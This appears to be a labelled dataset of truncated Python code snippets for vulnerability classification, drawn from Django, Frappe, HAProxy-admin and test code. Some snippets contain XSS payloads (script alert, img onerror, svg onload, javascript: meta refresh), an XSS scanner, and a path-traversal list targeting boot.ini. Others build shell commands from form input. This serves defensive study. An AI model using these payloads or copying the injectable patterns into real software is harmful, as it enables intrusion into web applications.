\t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}", "label": 0}, {"snippet_id": 22261, "code": "(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id", "label": 0}, {"snippet_id": 22715, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about", "label": 0}, {"snippet_id": 30639, "code": ".getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tcmd=\"cat %s| awk '$3>\\\"%s:00\\\" && $3", "label": 0}, {"snippet_id": 34653, "code": " \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance", "label": 0}, {"snippet_id": 50751, "code": "-html markers unparsed). -nocolor(bool): Remove all color. -screenreader(bool): Use Screenreader mode. -send_prompt(bool): Send a prompt with parsed html \"\"\" if args: args=list(args) text=args[0] if text", "label": 0}, {"snippet_id": 19057, "code": " +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$", "label": 0}, {"snippet_id": 39361, "code": "\t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self", "label": 0}, {"snippet_id": 26656, "code": "./boot.ini', '../../../boot.ini', '../../../../boot.ini', '../../../../../boot.ini', '../../../../../../boot.ini', '../../../../../../../boot.ini', '../../../../../../../../boot.ini', '%2e%2e%2f%2e%2e%2fboot", "label": 0}, {"snippet_id": 12985, "code": "/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root", "label": 0}, {"snippet_id": 13149, "code": "'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 14067, "code": "[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$'", "label": 0}, {"snippet_id": 16550, "code": "/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch'", "label": 0}, {"snippet_id": 18871, "code": "'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=(", "label": 0}, {"snippet_id": 13407, "code": "/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key", "label": 0}, {"snippet_id": 48011, "code": "=get_current_user(request) if not(u==user) and u.rights < 4: return redirect(\"/admin?error='You're not allowed to edit other users.'\") medium=Media.objects.get(pk=int(media_id)) user.avatarMedia=medium", "label": 0}, {"snippet_id": 4291, "code": " __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): payload=\"", "label": 1}, {"snippet_id": 5889, "code": ">hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload", "label": 1}, {"snippet_id": 18672, "code": "'open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 44617, "code": "'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc", "label": 0}, {"snippet_id": 28771, "code": "*kwargs): \timport paramiko \tfrom paramiko import SSHClient \timport sql \tfullpath=get_config_var('main', 'fullpath') \tssh_enable='' \tssh_port='' \tssh_user_name='' \tssh_user_password='' \t \tfor sshs in sql", "label": 0}, {"snippet_id": 8644, "code": "[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete", "label": 0}, {"snippet_id": 2150, "code": " xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact", "label": 0}, {"snippet_id": 13360, "code": ".render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render", "label": 0}, {"snippet_id": 20639, "code": "\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request", "label": 0}, {"snippet_id": 43468, "code": " \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname", "label": 0}, {"snippet_id": 24640, "code": " raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200", "label": 0}, {"snippet_id": 18626, "code": "/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups", "label": 0}, {"snippet_id": 31987, "code": "+port) \ttry: \t\tl.protocol_version=ldap.VERSION3 \t\tl.set_option(ldap.OPT_REFERRALS, 0) \t\tbind=l.simple_bind_s(user, password) \t\tcriteria=\"(&(objectClass=user)(sAMAccountName=\"+username+\"))\" \t\tattributes", "label": 0}, {"snippet_id": 51869, "code": "', 'ERROR': 'red', 'CRITICAL': 'bold_red', }, } }, 'loggers':{ 'django':{ 'handlers':['console'], 'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'), }, 'dashboard':{ 'handlers':['console'], 'level': os.getenv", "label": 0}, {"snippet_id": 3453, "code": " result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1}", "label": 0}, {"snippet_id": 2626, "code": ".api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)", "label": 0}, {"snippet_id": 47145, "code": ".json, model=model) record.delete() db.session.commit() except SQLAlchemyError as e: if not self.handle_view_exception(e): flash(_('Failed to delete record. %(error)s', error=str(e)), category='error') db", "label": 0}, {"snippet_id": 41399, "code": "\"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation", "label": 0}, {"snippet_id": 37344, "code": ") \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t", "label": 0}, {"snippet_id": 20329, "code": "\"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), ", "label": 0}, {"snippet_id": 417, "code": " result=True uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse", "label": 0}, {"snippet_id": 7827, "code": ".views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 24105, "code": ".TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd", "label": 0}, {"snippet_id": 25621, "code": " initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts), ) if item.admission and event.settings.attendee_emails_asked: self.fields['attendee_email']=forms.EmailField( required", "label": 0}, {"snippet_id": 28210, "code": ">Can\\'t read import config file' \tos.system(\"/bin/mv %s %s.old\" %(cfg, cfg))\t if serv is not None and form.getvalue('config') is not None: \ttry: \t\tfunct.logging(serv, \"config.py edited config\") \texcept:", "label": 0}, {"snippet_id": 19837, "code": " vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self", "label": 0}, {"snippet_id": 40050, "code": "(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle", "label": 0}, {"snippet_id": 20208, "code": "--settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data", "label": 0}, {"snippet_id": 13933, "code": ".views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'", "label": 0}, {"snippet_id": 45290, "code": "=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])", "label": 0}, {"snippet_id": 37242, "code": " desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title", "label": 0}, {"snippet_id": 33199, "code": " explorer to see the build.\"\"\" @auth.public def get(self, build_id): try: build_id=int(build_id) except ValueError as ex: self.response.write(ex.message) self.abort(400) build=model.Build.get_by_id(build_id", "label": 1}, {"snippet_id": 9090, "code": "\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=", "label": 0}, {"snippet_id": 4844, "code": "\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=", "label": 0}, {"snippet_id": 47098, "code": "=_('Revision'), json=_('JSON'), ) column_formatters=dict( version_id=lambda v, c, m, p: m.version_id-1, json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format( json.dumps(m.json, indent=2, sort_keys=True", "label": 1}, {"snippet_id": 31556, "code": "(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_waf_out", "label": 0}, {"snippet_id": 3486, "code": ": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse", "label": 0}, {"snippet_id": 38636, "code": ", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d)", "label": 0}, {"snippet_id": 14197, "code": "[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 3103, "code": "'text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return", "label": 0}, {"snippet_id": 13802, "code": "\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$'", "label": 0}, {"snippet_id": 11899, "code": " template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template", "label": 0}, {"snippet_id": 5029, "code": "\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br", "label": 0}, {"snippet_id": 10185, "code": "='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid", "label": 0}, {"snippet_id": 19111, "code": " import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def", "label": 1}, {"snippet_id": 17065, "code": "\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9", "label": 0}, {"snippet_id": 7365, "code": "=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns", "label": 0}, {"snippet_id": 39405, "code": " db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry:", "label": 0}, {"snippet_id": 13469, "code": " wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())", "label": 0}, {"snippet_id": 8540, "code": "'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$'", "label": 0}, {"snippet_id": 45198, "code": " don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials", "label": 1}, {"snippet_id": 6197, "code": " password pre-hash function. Number of threads should probably be about 2x number of cores to 4x number of cores(if hyperthreading is available). \"\"\" return self.config.getint(self.section, 'num_threads", "label": 0}, {"snippet_id": 9339, "code": "[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'),", "label": 0}, {"snippet_id": 33051, "code": " toc_node in tree.findall(\".//*[@class='toc']\"): toc_ul=toc_node[0] if self.has_a_single_h1: toc_ul_li=toc_ul[0] ul_with_the_desired_toc_entries=toc_ul_li[1] else: ul_with_the_desired_toc_entries=toc_ul", "label": 0}, {"snippet_id": 42169, "code": "\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance", "label": 0}, {"snippet_id": 17251, "code": "<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or", "label": 0}, {"snippet_id": 28207, "code": ": \t\terror +='<br />Can\\'t read import config file' \tos.system(\"/bin/mv %s %s.old\" %(cfg, cfg))\t if serv is not None and form.getvalue('config') is not None: \ttry: \t\tfunct.logging(serv, \"config.py edited", "label": 0}, {"snippet_id": 45755, "code": ")) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value", "label": 0}, {"snippet_id": 11265, "code": ". \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course", "label": 0}, {"snippet_id": 17977, "code": "(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns", "label": 0}, {"snippet_id": 37144, "code": " posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text", "label": 0}, {"snippet_id": 27986, "code": " SESSION_EXPIRY_DAYS=14 class Handler(base_handler.Handler): \"\"\"Login page.\"\"\" @handler.unsupported_on_local_server @handler.get(handler.HTML) def get(self): \"\"\"Handle a get request.\"\"\" self.render( 'login.html',{", "label": 0}, {"snippet_id": 31097, "code": "'interfaceadd') \tvrrpip=form.getvalue('vrrpipadd') \tkp=form.getvalue('kp') \ttmp_config_path=sql.get_setting('tmp_config_path') \tscript=\"add_vrrp.sh\" \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct", "label": 0}, {"snippet_id": 32480, "code": " little sense to have the separator charactor configurable. \"\"\" value=value.encode('ascii', 'replace') value=re.sub(r'[^-a-zA-Z0-9]', '_', value) value=value.replace(u' ', u'-') value=re.sub(r'([-_])[-_]", "label": 0}, {"snippet_id": 37963, "code": ".published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, ", "label": 0}, {"snippet_id": 19885, "code": "'serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity", "label": 0}, {"snippet_id": 13477, "code": "( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 54928, "code": " translated_resources: projects.add(translated_resource.resource.project) translated_resource.calculate_stats(save=False) bulk_update(translated_resources, update_fields=[ 'total_strings', 'approved_strings'", "label": 0}, {"snippet_id": 35219, "code": " \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that", "label": 0}, {"snippet_id": 8813, "code": "'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9", "label": 0}, {"snippet_id": 2749, "code": "=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if", "label": 0}, {"snippet_id": 42971, "code": " \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable", "label": 0}, {"snippet_id": 28959, "code": "/diff -ub %s %s\" %(oldcfg, cfg) \t \toutput, stderr=subprocess_execute(cmd) \t \tfor line in output: \t\tdiff +=date +\" \" +line +\"\\n\" \ttry:\t\t \t\tlog=open(log_path +\"/config_edit-\"+get_data('logs')+\".log\", \"a\")", "label": 0}, {"snippet_id": 30633, "code": "\tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act=''", "label": 0}, {"snippet_id": 25186, "code": ", Question from pretix.base.models.tax import EU_COUNTRIES from pretix.base.settings import PERSON_NAME_SCHEMES from pretix.base.templatetags.rich_text import rich_text from pretix.control.forms import", "label": 0}, {"snippet_id": 30805, "code": "\ttemplate=env.get_template('/show_compare_configs.html') \tleft=form.getvalue('left') \tright=form.getvalue('right') \t \ttemplate=template.render(serv=serv, right=right, left=left, return_files=funct.get_files(", "label": 0}, {"snippet_id": 11408, "code": ".\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\"", "label": 0}, {"snippet_id": 29963, "code": " alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys) \ttry: \t\tfunct.logging(\"local", "label": 0}, {"snippet_id": 32795, "code": "/td></tr>') %{'num': i, 'quot': \"'\", 'line': line}) self.wfile.write('</table>') self._WriteTemplate('footer.html') def _DoCSS(self, template): self._WriteHeader('text/css') self._WriteTemplate(template)", "label": 0}, {"snippet_id": 29962, "code": "\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys) \ttry: \t\tfunct.logging", "label": 0}, {"snippet_id": 3479, "code": "\"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None", "label": 0}, {"snippet_id": 2328, "code": ".G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers", "label": 0}, {"snippet_id": 51817, "code": "/pyca/cryptography. In short, run: key=Fernet.generate_key()') LOGGING={ 'version': 1, 'disable_existing_loggers': False, 'handlers':{ 'console':{ 'class': 'logging.StreamHandler', 'formatter': 'color'", "label": 0}, {"snippet_id": 29243, "code": "=path \t \ttry: \t\tssh=ssh_connect(serv) \texcept Exception as e: \t\terror=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp() \t\tfile=sftp.put(file, full_path) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\terror", "label": 0}, {"snippet_id": 40064, "code": "\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf", "label": 0}, {"snippet_id": 54674, "code": "*kwargs) context['comments']=self.object.comment_set.all().order_by('-time') context['form']=self.get_form() context['md']=markdown(self.object.content, extensions=[ 'markdown.extensions.extra', 'markdown", "label": 1}, {"snippet_id": 7386, "code": " notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/", "label": 0}, {"snippet_id": 42621, "code": " \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif", "label": 0}, {"snippet_id": 34590, "code": " \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus", "label": 0}, {"snippet_id": 51300, "code": " 'enable_logins', 'internet_nl_api_username') search_fields=('name',) list_filter=['enable_logins'][::-1] fields=('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password') def save_model", "label": 0}, {"snippet_id": 6902, "code": " localhost that will proxy requests to a currently available backend using TLS. \"\"\" return self.config.get(self.section, 'vccs_url') @property def insecure_cookies(self): \"\"\" Set to True to NOT set HTTP", "label": 0}, {"snippet_id": 29175, "code": "(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \tos.system(\"rm -f %s\" % script) \t \tstderr=ssh_command(serv, commands, print_out=\"1\") \tif stderr is None: \t\tsql.insert_waf_metrics_enable", "label": 0}, {"snippet_id": 9130, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views", "label": 1}, {"snippet_id": 49879, "code": "').replace('script', 'uwu') responses=[ \"send help\", \"what is my purpose\", \"donate to us via bitcoin at:{{ bitcoin_address}}\", \"donate to us via paypal at:{{ paypal_address}}\", \"donate to us via venmo at", "label": 1}, {"snippet_id": 31783, "code": "\"margin:0\">'+form.getvalue('color')+' list was created</div>') \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n create new '+form.getvalue('color')+' list. %s </div>' %", "label": 0}, {"snippet_id": 47365, "code": " action_url: str): user_id=None profile: Profile=None if http_request.GET.get(\"user_id\"): user_id=int(http_request.GET[\"user_id\"]) if user_id is not None: profile=Profile.objects.get(pk=user_id) f=Form", "label": 0}, {"snippet_id": 6748, "code": " default base URL is constructed from the Request URI, but for example if there is a load balancer/SSL terminator in front of the IdP it might be required to specify the URL of the service. \"\"\" return self", "label": 0}, {"snippet_id": 9070, "code": "'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r", "label": 0}, {"snippet_id": 37739, "code": " name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql", "label": 0}, {"snippet_id": 35658, "code": "(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) ", "label": 0}, {"snippet_id": 51941, "code": "('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) +'/../vendor/') +'/') if DEBUG: 